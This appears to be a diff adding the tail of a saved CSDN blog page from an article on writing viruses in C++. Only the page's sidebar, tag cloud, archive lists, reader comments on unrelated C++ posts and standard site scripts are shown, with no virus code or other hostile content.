+target="_blank">FTC</A> <A title="coremail" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/coremail" target="_blank">coremail</A> <A title="OPhone " 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/ophone" target="_blank">OPhone 
+</A> <A title="CouchBase" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/couchbase" 
+target="_blank">CouchBase</A> <A title="云计算" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/云计算" target="_blank">云计算</A> <A title="iOS6" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/iOS6" target="_blank">iOS6</A> 
+<A title="Rackspace " onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/rackspace" 
+target="_blank">Rackspace </A> <A title="Web App" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/webapp" target="_blank">Web App</A> <A title="SpringSide" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/springside" 
+target="_blank">SpringSide</A> <A title="Maemo" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/maemo" target="_blank">Maemo</A> <A title="Compuware" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/compuware" 
+target="_blank">Compuware</A> <A title="大数据" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/大数据" target="_blank">大数据</A> <A title="aptech" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/aptech" target="_blank">aptech</A> 
+<A title="Perl" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/perl" 
+target="_blank">Perl</A> <A title="Tornado" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/tornado" target="_blank">Tornado</A> <A title="Ruby" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/ruby" target="_blank">Ruby</A> 
+<A title="Hibernate" onclick="LogClickCount(this,336);" href="http://www.csdn.net/hibernate" 
+target="_blank">Hibernate</A> <A title="ThinkPHP" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/thinkphp" target="_blank">ThinkPHP</A> <A title="Spark" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/spark" target="_blank">Spark</A> 
+<A title="HBase" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/hbase" 
+target="_blank">HBase</A> <A title="Pure" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/pure" target="_blank">Pure</A> <A title="Solr" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/solr" target="_blank">Solr</A> 
+<A title="Angular" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/angular" 
+target="_blank">Angular</A> <A title="Cloud Foundry" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/cloudfoundry" target="_blank">Cloud Foundry</A> <A 
+title="Redis" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/redis" 
+target="_blank">Redis</A> <A title="Scala" onclick="LogClickCount(this,336);" 
+href="http://www.csdn.net/tag/scala" target="_blank">Scala</A> <A title="Django" 
+onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/django" target="_blank">Django</A> 
+<A title="Bootstrap" onclick="LogClickCount(this,336);" href="http://www.csdn.net/tag/bootstrap" 
+target="_blank">Bootstrap</A>     </DIV></DIV>
+<DIV class="clear"></DIV></DIV></DIV>
+<DIV id="side">
+<DIV class="side">
+<DIV class="panel" id="panel_Profile">
+<UL class="panel_head"><SPAN>个人资料</SPAN></UL>
+<UL class="panel_body profile">
+  <DIV id="blog_userface"><A href="http://my.csdn.net/ghevinn" 
+  target="_blank"><IMG title="访问我的空间" style="max-width: 90%;" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/1_ghevinn.jpg"> 
+      </A>     <BR><SPAN><A class="user_name" href="http://my.csdn.net/ghevinn" 
+  target="_blank">ghevinn</A></SPAN></DIV>
+  <DIV class="interact"><A title="[加关注]" class="attent" id="span_add_follow" 
+  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_guanzhu'])" 
+  href="javascript:void(0);"></A> <A title="[发私信]" class="letter" onclick="loginto(1)" 
+  href="javascript:void(0);"></A> </DIV>
+  <DIV id="blog_medal"></DIV>
+  <UL id="blog_rank">
+    <LI>访问：<SPAN>231366次</SPAN></LI>
+    <LI>积分：<SPAN>8426分</SPAN></LI>
+    <LI>排名：<SPAN>第534名</SPAN></LI></UL>
+  <UL id="blog_statistics">
+    <LI>原创：<SPAN>592篇</SPAN></LI>
+    <LI>转载：<SPAN>15篇</SPAN></LI>
+    <LI>译文：<SPAN>4篇</SPAN></LI>
+    <LI>评论：<SPAN>162条</SPAN></LI></UL></UL></DIV>
+<DIV class="panel" id="panel_Search">
+<UL class="panel_head"><SPAN>文章搜索</SPAN></UL>
+<UL class="panel_body">
+  <FORM class="form_search" id="frmSearch" action="http://so.csdn.net/search" 
+  target="_blank"><SPAN><INPUT title="请输入关键字" class="blogsearch" id="inputSearch" type="text"></SPAN> 
+          <INPUT title="search in blog" id="btnSubmit" type="submit" value="搜索"> 
+          <INPUT name="q" id="inputQ" type="hidden">         
+<INPUT name="t" type="hidden" value="blog">         <A id="btnSearchBlog" 
+  target="_blank"></A>         </FORM></UL></DIV>
+<DIV class="panel" id="panel_Category">
+<UL class="panel_head"><SPAN>文章分类</SPAN></UL>
+<UL class="panel_body">
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296712">c++专区</A><SPAN>(233)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1802383">MFC客户端</A><SPAN>(116)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2129419">STL相关</A><SPAN>(12)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2336393">算法</A><SPAN>(1)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296866">dll相关</A><SPAN>(16)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296553">内存相关</A><SPAN>(11)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1323385">.NET 
+  专区</A><SPAN>(43)</SPAN>             </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296560">C#专区</A><SPAN>(102)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1875431">COM开发</A><SPAN>(2)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2261087">VCL组件</A><SPAN>(1)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296579">数据库专区</A><SPAN>(13)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296558">功能函数测试集锦</A><SPAN>(72)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296674">错误解决办法库</A><SPAN>(48)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296830">注册表相关</A><SPAN>(4)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296555">面试题集锦</A><SPAN>(16)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2232907">c++基础知识拾遗</A><SPAN>(4)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296572">Windows操作系统有关</A><SPAN>(19)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296563">测试驱动开发（书）</A><SPAN>(1)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296562">Windows核心编程（书）</A><SPAN>(27)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1564749">大话设计模式（书）</A><SPAN>(2)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1564747">c++程序设计语言（书）</A><SPAN>(7)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1564745">c++编程思想（书）</A><SPAN>(10)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296577">命令行集合</A><SPAN>(8)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1350717">脚本之家</A><SPAN>(13)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296578">java专区</A><SPAN>(6)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1329639">Delphi相关</A><SPAN>(0)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296573">VS2010编译器有关</A><SPAN>(20)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1381597">开发中使用的工具软件相关</A><SPAN>(7)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1327231">工具仓库</A><SPAN>(5)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296822">搜索引擎设计</A><SPAN>(1)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296718">网络相关</A><SPAN>(8)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1331034">网页相关</A><SPAN>(4)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1284454">用心之作</A><SPAN>(59)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1802743">SSL证书相关</A><SPAN>(21)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296707">成功项目及源码</A><SPAN>(5)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296671">虚拟化架构集锦</A><SPAN>(5)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1848433">大型机械状态检测和故障诊断</A><SPAN>(5)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1298566">做个不断优秀的管理者</A><SPAN>(3)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2148449">程序员职业素养</A><SPAN>(4)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/1296576">感想小记</A><SPAN>(14)</SPAN> 
+              </LI>
+  <LI><A onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); " 
+  href="http://blog.csdn.net/ghevinn/article/category/2232963">博客中的问题跟踪解答</A><SPAN>(1)</SPAN> 
+              </LI></UL></DIV>
+<DIV class="panel" id="panel_Archive">
+<UL class="panel_head"><SPAN>文章存档</SPAN></UL>
+<UL class="panel_body">
+  <DIV id="archive_list"><!--归档统计--> 
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/07">2014年07月</A><SPAN>(9)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/06">2014年06月</A><SPAN>(36)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/05">2014年05月</A><SPAN>(5)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/04">2014年04月</A><SPAN>(29)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/03">2014年03月</A><SPAN>(23)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/02">2014年02月</A><SPAN>(13)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2014/01">2014年01月</A><SPAN>(17)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/12">2013年12月</A><SPAN>(36)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/10">2013年10月</A><SPAN>(36)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/09">2013年09月</A><SPAN>(13)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/08">2013年08月</A><SPAN>(51)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/07">2013年07月</A><SPAN>(5)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/06">2013年06月</A><SPAN>(1)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/04">2013年04月</A><SPAN>(9)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/03">2013年03月</A><SPAN>(51)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/02">2013年02月</A><SPAN>(28)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2013/01">2013年01月</A><SPAN>(74)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2012/12">2012年12月</A><SPAN>(17)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2012/11">2012年11月</A><SPAN>(46)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2012/10">2012年10月</A><SPAN>(48)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2012/09">2012年09月</A><SPAN>(23)</SPAN></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/month/2012/08">2012年08月</A><SPAN>(41)</SPAN></LI></DIV></UL></DIV>
+<DIV class="panel" id="hotarticls">
+<UL class="panel_head"><SPAN>阅读排行    </SPAN> </UL>
+<UL class="panel_body itemlist">
+  <LI><A title="银行招聘有关问题" href="http://blog.csdn.net/ghevinn/article/details/8078087">银行招聘有关问题</A><SPAN>(11986)</SPAN> 
+  </LI>
+  <LI><A title="win7 80端口被system占用" href="http://blog.csdn.net/ghevinn/article/details/8094184">win7 
+  80端口被system占用</A><SPAN>(2864)</SPAN> </LI>
+  <LI><A title="传智播客DotNet面试题 （原文转载酷小孩博客）" href="http://blog.csdn.net/ghevinn/article/details/7886276">传智播客DotNet面试题 
+  （原文转载酷小孩博客）</A><SPAN>(2677)</SPAN> </LI>
+  <LI><A title="windows7系统 您的账户已被停用。请向系统管理员咨询" href="http://blog.csdn.net/ghevinn/article/details/8650432">windows7系统 
+  您的账户已被停用。请向系统管理员咨询</A><SPAN>(2129)</SPAN> </LI>
+  <LI><A title="虚拟化架构之阿里云" href="http://blog.csdn.net/ghevinn/article/details/8133275">虚拟化架构之阿里云</A><SPAN>(1993)</SPAN> 
+  </LI>
+  <LI><A title="命令行编译build出错：error MSB6006: “mt.exe”已退出，代码为 31" href="http://blog.csdn.net/ghevinn/article/details/8254647">命令行编译build出错：error 
+  MSB6006: “mt.exe”已退出，代码为 31</A><SPAN>(1930)</SPAN> </LI>
+  <LI><A title="STL之Vector相关方法积累" href="http://blog.csdn.net/ghevinn/article/details/21722243">STL之Vector相关方法积累</A><SPAN>(1822)</SPAN> 
+  </LI>
+  <LI><A title="几个不错的c++面试题目" href="http://blog.csdn.net/ghevinn/article/details/8163170">几个不错的c++面试题目</A><SPAN>(1550)</SPAN> 
+  </LI>
+  <LI><A title="vs2010编译速度变慢的解决办法" href="http://blog.csdn.net/ghevinn/article/details/8588397">vs2010编译速度变慢的解决办法</A><SPAN>(1485)</SPAN> 
+  </LI>
+  <LI><A title='extern "C" _declspec(dllexport)浅析' href="http://blog.csdn.net/ghevinn/article/details/17297685">extern 
+  "C" _declspec(dllexport)浅析</A><SPAN>(1453)</SPAN> </LI></UL></DIV>
+<DIV class="panel" id="hotarticls2">
+<UL class="panel_head"><SPAN>评论排行</SPAN></UL>
+<UL class="panel_body itemlist">
+  <LI><A title="每个程序员都应该知道的福利" href="http://blog.csdn.net/ghevinn/article/details/8493159">每个程序员都应该知道的福利</A><SPAN>(9)</SPAN> 
+  </LI>
+  <LI><A title="关于字符串的相互转化问题(全)" href="http://blog.csdn.net/ghevinn/article/details/8115862">关于字符串的相互转化问题(全)</A><SPAN>(6)</SPAN> 
+  </LI>
+  <LI><A title="腾讯科技（北京）有限公司--面试题" href="http://blog.csdn.net/ghevinn/article/details/8211206">腾讯科技（北京）有限公司--面试题</A><SPAN>(6)</SPAN> 
+  </LI>
+  <LI><A title="怎样改变Windows字体文件夹c:\windows\fonts" href="http://blog.csdn.net/ghevinn/article/details/8509048">怎样改变Windows字体文件夹c:\windows\fonts</A><SPAN>(5)</SPAN> 
+  </LI>
+  <LI><A title="深入探究函数返回局部变量" href="http://blog.csdn.net/ghevinn/article/details/10554255">深入探究函数返回局部变量</A><SPAN>(5)</SPAN> 
+  </LI>
+  <LI><A title="想写点就写点吧" href="http://blog.csdn.net/ghevinn/article/details/8128013">想写点就写点吧</A><SPAN>(5)</SPAN> 
+  </LI>
+  <LI><A title="sprintf_s实现int数组转换成char数组" href="http://blog.csdn.net/ghevinn/article/details/9975121">sprintf_s实现int数组转换成char数组</A><SPAN>(4)</SPAN> 
+  </LI>
+  <LI><A title="c++编写病毒入门" href="http://blog.csdn.net/ghevinn/article/details/8514900">c++编写病毒入门</A><SPAN>(4)</SPAN> 
+  </LI>
+  <LI><A title="sizeof和strlen的区别和联系总结" href="http://blog.csdn.net/ghevinn/article/details/9974967">sizeof和strlen的区别和联系总结</A><SPAN>(3)</SPAN> 
+  </LI>
+  <LI><A title="c++中 接口" href="http://blog.csdn.net/ghevinn/article/details/8127030">c++中 
+  接口</A><SPAN>(3)</SPAN> </LI></UL></DIV>
+<DIV class="panel" id="newcomments">
+<UL class="panel_head"><SPAN>最新评论</SPAN></UL>
+<UL class="panel_body itemlist">
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/8254647#comments">命令行编译build出错：error 
+  MSB6006: “mt.exe”已退出，代码为 31</A>     
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/li880wert">li880wert</A>: 
+  有用，编绎成功了     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/8211206#comments">腾讯科技（北京）有限公司--面试题</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/ghevinn">ghevinn</A>:
+   @Henzox:嗯嗯嗯，     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/36373177#comments">设置WS_EX_CLIENTEDGE窗口风格</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/ghevinn">ghevinn</A>:
+   WS_EX_CLIENTEDGE：指定窗口有一个带阴影的边界。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/36373177#comments">腾讯科技（北京）有限公司--面试题</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  这些题目确实蛮基础，出的蛮好。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/28894217#comments">malloc()参数为0的情况</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  这个平时还真没注意到。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/35235955#comments">CWnd::Attach()详解</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  说白了，就是对 HWND 的封装。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/35235097#comments">将屏幕保存为图片 
+  将当前MFC程序保存为图片 c++ vc</A>     
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  不要问我为什么知道，因为我项目中遇到过。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/35235097#comments">将屏幕保存为图片 
+  将当前MFC程序保存为图片 c++ vc</A>     
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  因为创建桌面这么大的 DC,是很有可能创建失败的。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/35235097#comments">将屏幕保存为图片 
+  将当前MFC程序保存为图片 c++ vc</A>     
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/Henzox">Henzox</A>: 
+  代码有效的验证是个好习惯。     </P></LI>
+  <LI><A 
+  href="http://blog.csdn.net/ghevinn/article/details/30265931#comments">c++文件读写操作</A> 
+      
+  <P style="margin: 0px;"><A class="user_name" href="http://blog.csdn.net/ghevinn">ghevinn</A>:
+   //向文件中写入内容                ofstream out;		out.open(...     
+</P></LI></UL></DIV></DIV>
+<DIV class="clear"></DIV></DIV>
+<DIV class="clear"></DIV></DIV>
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/cnick.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/newblog.min.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/showblogmedal.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT type="text/javascript">
+    document.write('<script type="text/javascript" src="http://csdnimg.cn/pubfooter/js/publib_footer.js?' + Math.floor(new Date() / 120000).toString(36) + '="></' + 'script>');
+</SCRIPT>
+     
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/login.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT type="text/javascript">document.write("<img src=http://counter.csdn.net/pv.aspx?id=24 border=0 width=0 height=0>");</SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/counter.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/ad-blog.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/count.js" type="text/javascript"></SCRIPT>
+ 
+<SCRIPT type="text/javascript">
+    $(function () {
+        function __get_code_toolbar(snippet_id) {
+            return $("<a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "' target='_blank' title='在CODE上查看代码片' style='text-indent:0;'><img src='https://code.csdn.net/assets/CODE_ico.png' width=12 height=12 alt='在CODE上查看代码片' style='position:relative;top:1px;left:2px;'/></a>"
+                    + "<a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "/fork' target='_blank' title='派生到我的代码片'  style='text-indent:0;'><img src='https://code.csdn.net/assets/ico_fork.svg' width=12 height=12 alt='派生到我的代码片' style='position:relative;top:2px;left:2px;'/></a>");
+        }
+        
+        $("[code_snippet_id]").each(function () {
+            __s_id = $(this).attr("code_snippet_id");
+            if (__s_id != null && __s_id != "" && __s_id != 0 && parseInt(__s_id) > 70020) {
+                __code_tool = __get_code_toolbar(__s_id);
+                $(this).prev().find(".tools").append(__code_tool);
+            }
+        });
+    });
+</SCRIPT>
+     </DIV><!--new top-->         
+<SCRIPT id="csdn-toolbar-id" src="c++编写病毒入门%20-%20ghevinn欢迎您光临%20-%20博客频道%20-%20CSDN_NET_files/toolbar.js" type="text/javascript" subcount="5" count="5" wrapid="note1" btnid="header_notice_num"></SCRIPT>
+      <!--new top--> </BODY></HTML>
